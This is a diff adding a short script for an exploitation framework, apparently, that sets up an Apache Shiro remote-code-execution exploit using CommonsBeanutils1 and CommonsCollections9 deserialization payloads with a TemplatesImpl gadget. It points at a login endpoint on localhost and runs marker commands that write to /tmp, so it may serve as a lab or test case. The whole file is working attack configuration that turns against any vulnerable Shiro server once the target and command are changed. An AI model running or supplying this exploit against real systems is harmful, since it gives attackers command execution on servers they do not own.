@@ -1,0 +1,12 @@
+use exploit ShiroRCE1
+use payload CommonsBeanutils1
+use bullet TemplatesImplBullet
+set target http://localhost:8080/doLogin
+set postData "username=111&password=1111"
+set body "echo /tmp/success"
+run
+
+use payload CommonsCollections9
+use bullet TemplatesImplBullet
+set body "touch /tmp/success"
+run
